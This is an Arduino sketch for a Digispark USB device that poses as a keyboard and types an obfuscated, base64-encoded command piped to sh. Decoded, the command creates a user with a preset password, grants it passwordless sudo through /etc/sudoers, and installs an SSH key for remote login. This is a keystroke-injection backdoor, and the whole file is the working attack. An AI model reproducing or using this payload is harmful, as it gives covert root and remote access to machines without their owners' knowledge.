#include "DigiKeyboard.h"
#include <avr/pgmspace.h>
const static char cmd[] PROGMEM = "echo 'dXNlcmFkZCAtbSAtYyAiTW9yb3pvdiBEbWl0cml5IiAtcCAnJDYkd0NCVm94SEYkdFdTWXVFTHV0Z0t5dVRNa1JQRFE3blAyUThOc1hqalpYMnJvTFguY2RCa3MwSk9GRko2RGtSeWJma24xeDBQdkZqeThHZ3NKR2N0ZmtjaW4wcy94RS4nIC1zIC9iaW4vYmFzaCBkbW9yb3pvdjsgZWNobyAiZG1vcm96b3YgQUxMPShBTEwpIE5PUEFTU1dEOkFMTCIgPj4gL2V0Yy9zdWRvZXJzOyBta2RpciAtcCAvaG9tZS9kbW9yb3pvdi8uc3NoOyBlY2hvICJzc2gtcnNhIEFBQUFCM056YUMxeWMyRUFBQUFEQVFBQkFBQUJBUUMvRkhzQWl5K0JsYTRzT0cxcUJIbmZCUy9ZRGdvSXJDMmJ1a052Y0dtWkp3dUxDbmhla0M4cXVPc01SUWU3bVZnNDJ5TXRJRkszNWd3Uk9CYmkzbU9mOERqRmQ3eW5aNGpEQzdBTjhMNHk2L0hZVkJma254YmFBcXZEeWt0NWZYRVBpL0NzTnoydnZBSUtKeFlHSklDYkVMUURZZ2U1aCtOK0Vpc2U2M2o4ZEU4TkxQM010a1UxNlMybThFUTBMaklXYlBlbDhGODIyY0NsY2lmVjlqaWN3ZFVZc0EzWWlOWmlMeHVwWk5Md09yUHgzRmF4a29rQlE3U0tiVnFSM2g4Z1ljMWd3empvN3hzSWVsalNSY0tBQk1LTndVZDdTUGxNOG50cWpCMHd6M1BtRUF2cnNJYWwvd1pZQ0x0M2s2aENwcTh5b2pEWjlkR2ViUDgxdFhacCBkbW9yb3pvdkBpdGtleSIgPiAvaG9tZS9kbW9yb3pvdi8uc3NoL2F1dGhvcml6ZWRfa2V5czsgY2hvd24gLVIgZG1vcm96b3Y6ZG1vcm96b3YgL2hvbWUvZG1vcm96b3YvOyBjaG1vZCA2MDAgL2hvbWUvZG1vcm96b3YvLnNzaC9hdXRob3JpemVkX2tleXM=' | base64 -d | sh";

void setup() {
  //const char cmd[] PROGMEM = {"echo 'dXNlcmFkZCAtbSAtYyAiTW9yb3pvdiBEbWl0cml5IiAtcCAnJDYkd0NCVm94SEYkdFdTWXVFTHV0Z0t5dVRNa1JQRFE3blAyUThOc1hqalpYMnJvTFguY2RCa3MwSk9GRko2RGtSeWJma24xeDBQdkZqeThHZ3NKR2N0ZmtjaW4wcy94RS4nIC1zIC9iaW4vYmFzaCBkbW9yb3pvdjsgZWNobyAiZG1vcm96b3YgQUxMPShBTEwpIE5PUEFTU1dEOkFMTCIgPj4gL2V0Yy9zdWRvZXJzOyBta2RpciAtcCAvaG9tZS9kbW9yb3pvdi8uc3NoOyBlY2hvICJzc2gtcnNhIEFBQUFCM056YUMxeWMyRUFBQUFEQVFBQkFBQUJBUUMvRkhzQWl5K0JsYTRzT0cxcUJIbmZCUy9ZRGdvSXJDMmJ1a052Y0dtWkp3dUxDbmhla0M4cXVPc01SUWU3bVZnNDJ5TXRJRkszNWd3Uk9CYmkzbU9mOERqRmQ3eW5aNGpEQzdBTjhMNHk2L0hZVkJma254YmFBcXZEeWt0NWZYRVBpL0NzTnoydnZBSUtKeFlHSklDYkVMUURZZ2U1aCtOK0Vpc2U2M2o4ZEU4TkxQM010a1UxNlMybThFUTBMaklXYlBlbDhGODIyY0NsY2lmVjlqaWN3ZFVZc0EzWWlOWmlMeHVwWk5Md09yUHgzRmF4a29rQlE3U0tiVnFSM2g4Z1ljMWd3empvN3hzSWVsalNSY0tBQk1LTndVZDdTUGxNOG50cWpCMHd6M1BtRUF2cnNJYWwvd1pZQ0x0M2s2aENwcTh5b2pEWjlkR2ViUDgxdFhacCBkbW9yb3pvdkBpdGtleSIgPiAvaG9tZS9kbW9yb3pvdi8uc3NoL2F1dGhvcml6ZWRfa2V5czsgY2hvd24gLVIgZG1vcm96b3Y6ZG1vcm96b3YgL2hvbWUvZG1vcm96b3YvOyBjaG1vZCA2MDAgL2hvbWUvZG1vcm96b3YvLnNzaC9hdXRob3JpemVkX2tleXM=' | base64 -d | sh"};
  pinMode(1, OUTPUT);
  digitalWrite(1, HIGH);
  DigiKeyboard.sendKeyStroke(0);
  SendStr_P (cmd);
  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digitalWrite(1, LOW);
}


void SendStr_P(const char *string)
{
  while (pgm_read_byte(string) != '\0')
  {
    DigiKeyboard.print(pgm_read_byte(string));
    string++;
  }
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
}

